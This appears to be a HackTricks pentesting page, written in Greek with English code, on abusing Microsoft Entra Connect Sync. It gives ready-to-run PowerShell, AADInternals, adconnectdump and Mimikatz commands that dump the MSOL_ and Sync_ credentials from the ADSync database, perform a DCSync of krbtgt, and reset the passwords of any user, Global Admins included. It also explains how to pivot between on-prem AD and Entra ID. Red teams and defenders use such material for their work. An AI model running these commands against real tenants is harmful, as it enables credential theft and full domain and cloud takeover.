# Az - Connect Sync

{{#include ../../../../banners/hacktricks-training.md}}

## Basic Information

[Από τα έγγραφα:](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/how-to-connect-sync-whatis) Οι υπηρεσίες συγχρονισμού Microsoft Entra Connect (Microsoft Entra Connect Sync) είναι ένα κύριο συστατικό του Microsoft Entra Connect. Φροντίζει για όλες τις λειτουργίες που σχετίζονται με τη συγχρονισμένη ταυτότητα δεδομένων μεταξύ του τοπικού σας περιβάλλοντος και του Microsoft Entra ID.

Για να το χρησιμοποιήσετε, είναι απαραίτητο να εγκαταστήσετε τον **`Microsoft Entra Connect Sync`** πράκτορα σε έναν διακομιστή μέσα στο περιβάλλον AD σας. Αυτός ο πράκτορας θα είναι υπεύθυνος για τη συγχρονισμένη πλευρά του AD.

<figure><img src="../../../../images/image (173).png" alt=""><figcaption></figcaption></figure>

Ο **Connect Sync** είναι βασικά ο "παλιός" τρόπος του Azure για **να συγχρονίσει τους χρήστες από το AD στο Entra ID.** Ο νέος προτεινόμενος τρόπος είναι να χρησιμοποιήσετε το **Entra Cloud Sync**:

{{#ref}}
az-cloud-sync.md
{{#endref}}

### Principals Generated

- Ο λογαριασμός **`MSOL_<installationID>`** δημιουργείται αυτόματα στο τοπικό AD. Αυτός ο λογαριασμός έχει ρόλο **Directory Synchronization Accounts** (βλ. [τεκμηρίωση](https://docs.microsoft.com/en-us/azure/active-directory/users-groups-roles/directory-assign-admin-roles#directory-synchronization-accounts-permissions)) που σημαίνει ότι έχει **δικαιώματα αναπαραγωγής (DCSync) στο τοπικό AD**.
- Αυτό σημαίνει ότι οποιοσδήποτε συμβιβάσει αυτόν τον λογαριασμό θα μπορεί να συμβιβάσει το τοπικό domain.
- Ένας διαχειριζόμενος λογαριασμός υπηρεσίας **`ADSyncMSA<id>`** δημιουργείται στο τοπικό AD χωρίς ειδικά προνόμια από προεπιλογή.
- Στο Entra ID, ο Service Principal **`ConnectSyncProvisioning_ConnectSync_<id>`** δημιουργείται με ένα πιστοποιητικό.

## Synchronize Passwords

### Password Hash Synchronization

Αυτό το συστατικό μπορεί επίσης να χρησιμοποιηθεί για **να συγχρονίσει τους κωδικούς πρόσβασης από το AD στο Entra ID** ώστε οι χρήστες να μπορούν να χρησιμοποιούν τους κωδικούς πρόσβασης του AD για να συνδεθούν στο Entra ID. Για αυτό, είναι απαραίτητο να επιτραπεί ο συγχρονισμός κωδικών πρόσβασης στο Microsoft Entra Connect Sync agent που είναι εγκατεστημένος σε έναν διακομιστή AD.

[Από τα έγγραφα:](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/whatis-phs) Ο **συγχρονισμός κωδικών πρόσβασης** είναι μία από τις μεθόδους σύνδεσης που χρησιμοποιούνται για να επιτευχθεί η υβριδική ταυτότητα. Ο **Azure AD Connect** συγχρονίζει ένα hash, του hash, του κωδικού πρόσβασης ενός χρήστη από μια τοπική Active Directory εγκατάσταση σε μια cloud-based Azure AD εγκατάσταση.

Βασικά, όλοι οι **χρήστες** και ένα **hash των κωδικών πρόσβασης** συγχρονίζονται από το τοπικό στο Azure AD. Ωστόσο, οι **κωδικοί πρόσβασης σε καθαρό κείμενο** ή οι **αρχικοί** **hashes** δεν αποστέλλονται στο Azure AD.

Ο **συγχρονισμός των hashes** συμβαίνει κάθε **2 λεπτά**. Ωστόσο, από προεπιλογή, η **λήξη κωδικών πρόσβασης** και η **λήξη λογαριασμού** **δεν συγχρονίζονται** στο Azure AD. Έτσι, ένας χρήστης του οποίου ο **τοπικός κωδικός πρόσβασης έχει λήξει** (δεν έχει αλλάξει) μπορεί να συνεχίσει να **έχει πρόσβαση σε πόρους Azure** χρησιμοποιώντας τον παλιό κωδικό πρόσβασης.

Όταν ένας τοπικός χρήστης θέλει να έχει πρόσβαση σε έναν πόρο Azure, η **αυθεντικοποίηση πραγματοποιείται στο Azure AD**.

> [!NOTE]
> Από προεπιλογή, οι χρήστες γνωστών προνομιακών ομάδων όπως οι Domain Admins με το χαρακτηριστικό **`adminCount` σε 1 δεν συγχρονίζονται** με το Entra ID για λόγους ασφαλείας. Ωστόσο, άλλοι χρήστες που είναι μέλη προνομιακών ομάδων χωρίς αυτό το χαρακτηριστικό ή που έχουν ανατεθεί υψηλά προνόμια απευθείας **μπορούν να συγχρονιστούν**.

### Password Writeback

Αυτή η ρύθμιση επιτρέπει να **συγχρονίζονται οι κωδικοί πρόσβασης από το Entra ID στο AD** όταν ένας χρήστης αλλάζει τον κωδικό του στο Entra ID. Σημειώστε ότι για να λειτουργήσει η εγγραφή κωδικών πρόσβασης, ο χρήστης `MSOL_<id>` που δημιουργείται αυτόματα στο AD πρέπει να του παραχωρηθούν [περισσότερα προνόμια όπως αναφέρεται στα έγγραφα](https://learn.microsoft.com/en-us/entra/identity/authentication/tutorial-enable-sspr-writeback) ώστε να μπορεί να **τροποποιήσει τους κωδικούς πρόσβασης οποιουδήποτε χρήστη στο AD**.

Αυτό είναι ιδιαίτερα ενδιαφέρον για να συμβιβάσετε το AD από ένα συμβιβασμένο Entra ID, καθώς θα μπορείτε να τροποποιήσετε τον κωδικό πρόσβασης "σχεδόν" οποιουδήποτε χρήστη.

Οι διαχειριστές τομέα και άλλοι χρήστες που ανήκουν σε ορισμένες προνομιακές ομάδες δεν αναπαράγονται αν η ομάδα έχει το χαρακτηριστικό **`adminCount` σε 1**. Αλλά άλλοι χρήστες που έχουν ανατεθεί υψηλά προνόμια μέσα στο AD χωρίς να ανήκουν σε καμία από αυτές τις ομάδες θα μπορούσαν να έχουν τον κωδικό τους αλλάξει. Για παράδειγμα:

- Χρήστες που έχουν ανατεθεί υψηλά προνόμια απευθείας.
- Χρήστες από την ομάδα **`DNSAdmins`**.
- Χρήστες από την ομάδα **`Group Policy Creator Owners`** που έχουν δημιουργήσει GPOs και τους έχουν αναθέσει σε OUs θα μπορούν να τροποποιήσουν τα GPOs που δημιούργησαν.
- Χρήστες από την **`Cert Publishers Group`** που μπορούν να δημοσιεύσουν πιστοποιητικά στο Active Directory.
- Χρήστες οποιασδήποτε άλλης ομάδας με υψηλά προνόμια χωρίς το χαρακτηριστικό **`adminCount` σε 1**.

## Pivoting AD --> Entra ID

### Enumerating Connect Sync

Ελέγξτε για χρήστες:
```bash
# Check for the users created by the Connect Sync
Install-WindowsFeature RSAT-AD-PowerShell
Import-Module ActiveDirectory
Get-ADUser -Filter "samAccountName -like 'MSOL_*'" -Properties * | select SamAccountName,Description | fl
Get-ADServiceAccount -Filter "SamAccountName -like 'ADSyncMSA*'" -Properties SamAccountName,Description | Select-Object SamAccountName,Description | fl
Get-ADUser -Filter "samAccountName -like 'Sync_*'" -Properties * | select SamAccountName,Description | fl

# Check it using raw LDAP queries without needing an external module
$searcher = New-Object System.DirectoryServices.DirectorySearcher
$searcher.Filter = "(samAccountName=MSOL_*)"
$searcher.FindAll()
$searcher.Filter = "(samAccountName=ADSyncMSA*)"
$searcher.FindAll()
$searcher.Filter = "(samAccountName=Sync_*)"
$searcher.FindAll()
```
Ελέγξτε για τη **διαμόρφωση Connect Sync** (αν υπάρχει):
```bash
az rest --url "https://graph.microsoft.com/v1.0/directory/onPremisesSynchronization"
# Check if password sychronization is enabled, if password and group writeback are enabled...
```
### Εύρεση των κωδικών πρόσβασης

Οι κωδικοί πρόσβασης του **`MSOL_*`** χρήστη (και του **Sync\_\*** χρήστη αν έχει δημιουργηθεί) είναι **αποθηκευμένοι σε έναν SQL server** στον διακομιστή όπου είναι **εγκατεστημένο το Entra ID Connect.** Οι διαχειριστές μπορούν να εξάγουν τους κωδικούς πρόσβασης αυτών των προνομιακών χρηστών σε καθαρό κείμενο.\
Η βάση δεδομένων βρίσκεται στο `C:\Program Files\Microsoft Azure AD Sync\Data\ADSync.mdf`.

Είναι δυνατή η εξαγωγή της διαμόρφωσης από έναν από τους πίνακες, με έναν κρυπτογραφημένο:

`SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent;`

Η **κρυπτογραφημένη διαμόρφωση** είναι κρυπτογραφημένη με **DPAPI** και περιέχει τους **κωδικούς πρόσβασης του `MSOL_*`** χρήστη στο on-prem AD και τον κωδικό πρόσβασης του **Sync\_\*** στο AzureAD. Επομένως, η παραβίαση αυτών επιτρέπει την ανύψωση προνομίων στο AD και στο AzureAD.

Μπορείτε να βρείτε μια [πλήρη επισκόπηση του πώς αποθηκεύονται και αποκρυπτογραφούνται αυτά τα διαπιστευτήρια σε αυτή την ομιλία](https://www.youtube.com/watch?v=JEIR5oGCwdg).

### Κατάχρηση MSOL\_\*
```bash
# Once the Azure AD connect server is compromised you can extract credentials with the AADInternals module
Install-Module -Name AADInternals -RequiredVersion 0.9.0 # Uninstall-Module AADInternals  if you have a later version
Import-Module AADInternals
Get-AADIntSyncCredentials
# Or check DumpAADSyncCreds.exe from https://github.com/Hagrid29/DumpAADSyncCreds/tree/main

# Using https://github.com/dirkjanm/adconnectdump
python .\adconnectdump.py [domain.local]/administrator:<password>@192.168.10.80
.\ADSyncQuery.exe C:\Users\eitot\Tools\adconnectdump\ADSync.mdf > out.txt
python .\adconnectdump.py [domain.local]/administrator:<password>@192.168.10.80 --existing-db --from-file out.txt

# Using the creds of MSOL_* account, you can run DCSync against the on-prem AD
runas /netonly /user:defeng.corp\MSOL_123123123123 cmd
Invoke-Mimikatz -Command '"lsadump::dcsync /user:domain\krbtgt /domain:domain.local /dc:dc.domain.local"'
```
> [!WARNING]
> Προηγούμενες επιθέσεις έχουν παραβιάσει τον άλλο κωδικό πρόσβασης για να συνδεθούν στον χρήστη Entra ID που ονομάζεται `Sync_*` και στη συνέχεια να παραβιάσουν το Entra ID. Ωστόσο, αυτός ο χρήστης δεν υπάρχει πλέον.

### Κατάχρηση ConnectSyncProvisioning_ConnectSync\_<id>

Αυτή η εφαρμογή δημιουργείται χωρίς να έχουν ανατεθεί ρόλοι διαχείρισης Entra ID ή Azure. Ωστόσο, έχει τις εξής άδειες API:

- Microsoft Entra AD Synchronization Service
- `ADSynchronization.ReadWrite.All`
- Υπηρεσία επαναφοράς κωδικού πρόσβασης Microsoft
- `PasswordWriteback.OffboardClient.All`
- `PasswordWriteback.RefreshClient.All`
- `PasswordWriteback.RegisterClientVersion.All`

Αναφέρεται ότι το SP αυτής της εφαρμογής μπορεί να χρησιμοποιηθεί για την εκτέλεση κάποιων προνομιακών ενεργειών χρησιμοποιώντας μια μη τεκμηριωμένη API, αλλά δεν έχει βρεθεί ακόμη PoC, όσο γνωρίζω.\
Σε κάθε περίπτωση, σκεπτόμενοι ότι αυτό μπορεί να είναι δυνατό, θα ήταν ενδιαφέρον να εξερευνήσουμε περαιτέρω πώς να βρούμε το πιστοποιητικό για να συνδεθούμε ως αυτός ο υπηρεσιακός κύριος και να προσπαθήσουμε να το καταχραστούμε.

Αυτή η [δημοσίευση στο blog](https://posts.specterops.io/update-dumping-entra-connect-sync-credentials-4a9114734f71) κυκλοφόρησε λίγο πριν την αλλαγή από τη χρήση του χρήστη `Sync_*` σε αυτόν τον υπηρεσιακό κύριο, εξήγησε ότι το πιστοποιητικό αποθηκευόταν μέσα στον διακομιστή και ήταν δυνατό να το βρούμε, να δημιουργήσουμε PoP (Proof of Possession) αυτού και γραφικό token, και με αυτό, να μπορέσουμε να προσθέσουμε ένα νέο πιστοποιητικό στον υπηρεσιακό κύριο (διότι ένας **υπηρεσιακός κύριος** μπορεί πάντα να αναθέτει νέα πιστοποιητικά στον εαυτό του) και στη συνέχεια να το χρησιμοποιήσουμε για να διατηρήσουμε την επιμονή ως SP.

Για να εκτελέσουμε αυτές τις ενέργειες, τα εξής εργαλεία έχουν δημοσιευθεί: [SharpECUtils](https://github.com/hotnops/ECUtilities/tree/main/SharpECUtils).

Από την εμπειρία μου, το πιστοποιητικό δεν αποθηκεύεται πλέον στο μέρος όπου το προηγούμενο εργαλείο το αναζητούσε, και επομένως, το εργαλείο δεν λειτουργεί πλέον. Έτσι, μπορεί να χρειαστεί περαιτέρω έρευνα.

### Κατάχρηση Sync\_\* [ΑΚΥΡΩΘΕΙ]

> [!WARNING]
> Προηγουμένως, ένας χρήστης που ονομάζεται `Sync_*` είχε δημιουργηθεί στο Entra ID με πολύ ευαίσθητες άδειες που επιτρέπουν την εκτέλεση προνομιακών ενεργειών όπως η τροποποίηση του κωδικού πρόσβασης οποιουδήποτε χρήστη ή η προσθήκη νέας διαπιστευτηρίου σε έναν υπηρεσιακό κύριο. Ωστόσο, από τον Ιανουάριο του 2025, αυτός ο χρήστης δεν δημιουργείται πλέον από προεπιλογή καθώς τώρα χρησιμοποιείται η Εφαρμογή/SP **`ConnectSyncProvisioning_ConnectSync_<id>`**. Ωστόσο, μπορεί να είναι ακόμη παρών σε ορισμένα περιβάλλοντα, οπότε αξίζει να το ελέγξετε.

Η παραβίαση του λογαριασμού **`Sync_*`** επιτρέπει την **επανεγγραφή του κωδικού πρόσβασης** οποιουδήποτε χρήστη (συμπεριλαμβανομένων των Παγκόσμιων Διαχειριστών)
```bash
Install-Module -Name AADInternals -RequiredVersion 0.9.0 # Uninstall-Module AADInternals  if you have a later version
Import-Module AADInternals

# This command, run previously, will give us alse the creds of this account
Get-AADIntSyncCredentials

# Get access token for Sync_* account
$passwd = ConvertTo-SecureString '<password>' -AsPlainText - Force
$creds = New-Object System.Management.Automation.PSCredential ("Sync_SKIURT-JAUYEH_123123123123@domain.onmicrosoft.com", $passwd)
Get-AADIntAccessTokenForAADGraph -Credentials $creds - SaveToCache

# Get global admins
Get-AADIntGlobalAdmins

# Get the ImmutableId of an on-prem user in Azure AD (this is the Unique Identifier derived from on-prem GUID)
Get-AADIntUser -UserPrincipalName onpremadmin@domain.onmicrosoft.com | select ImmutableId

# Reset the users password
Set-AADIntUserPassword -SourceAnchor "3Uyg19ej4AHDe0+3Lkc37Y9=" -Password "JustAPass12343.%" -Verbose

# Now it's possible to access Azure AD with the new password and op-prem with the old one (password changes aren't sync)
```
Είναι επίσης δυνατό να **τροποποιήσετε τους κωδικούς πρόσβασης μόνο των χρηστών του cloud** (ακόμα και αν αυτό είναι απροσδόκητο)
```bash
# To reset the password of cloud only user, we need their CloudAnchor that can be calculated from their cloud objectID
# The CloudAnchor is of the format USER_ObjectID.
Get-AADIntUsers | ?{$_.DirSyncEnabled -ne "True"} | select UserPrincipalName,ObjectID

# Reset password
Set-AADIntUserPassword -CloudAnchor "User_19385ed9-sb37-c398-b362-12c387b36e37" -Password "JustAPass12343.%" -Verbosewers
```
Είναι επίσης δυνατό να εκχυθεί ο κωδικός πρόσβασης αυτού του χρήστη.

> [!CAUTION]
> Μια άλλη επιλογή θα ήταν να **ανατεθούν προνομιακές άδειες σε έναν service principal**, τις οποίες ο χρήστης **Sync** έχει **δικαιώματα** να κάνει, και στη συνέχεια να **προσεγγιστεί αυτός ο service principal** ως τρόπος privesc.

### Seamless SSO

Είναι δυνατό να χρησιμοποιηθεί το Seamless SSO με PHS, το οποίο είναι ευάλωτο σε άλλες καταχρήσεις. Ελέγξτε το εδώ:

{{#ref}}
seamless-sso.md
{{#endref}}

## Pivoting Entra ID --> AD

- Εάν η δυνατότητα επαναφοράς κωδικού πρόσβασης είναι ενεργοποιημένη, μπορείτε να **τροποποιήσετε τον κωδικό πρόσβασης οποιουδήποτε χρήστη στο AD** που συγχρονίζεται με το Entra ID.
- Εάν η δυνατότητα επαναφοράς ομάδων είναι ενεργοποιημένη, μπορείτε να **προσθέσετε χρήστες σε προνομιακές ομάδες** στο Entra ID που συγχρονίζονται με το AD.

## References

- [https://learn.microsoft.com/en-us/azure/active-directory/hybrid/whatis-phs](https://learn.microsoft.com/en-us/azure/active-directory/hybrid/whatis-phs)
- [https://aadinternals.com/post/on-prem_admin/](https://aadinternals.com/post/on-prem_admin/)
- [https://troopers.de/downloads/troopers19/TROOPERS19_AD_Im_in_your_cloud.pdf](https://troopers.de/downloads/troopers19/TROOPERS19_AD_Im_in_your_cloud.pdf)
- [https://www.youtube.com/watch?v=xei8lAPitX8](https://www.youtube.com/watch?v=xei8lAPitX8)
- [https://www.silverfort.com/blog/exploiting-weaknesses-in-entra-id-account-synchronization-to-compromise-the-on-prem-environment/](https://www.silverfort.com/blog/exploiting-weaknesses-in-entra-id-account-synchronization-to-compromise-the-on-prem-environment/)
- [https://posts.specterops.io/update-dumping-entra-connect-sync-credentials-4a9114734f71](https://posts.specterops.io/update-dumping-entra-connect-sync-credentials-4a9114734f71)

{{#include ../../../../banners/hacktricks-training.md}}
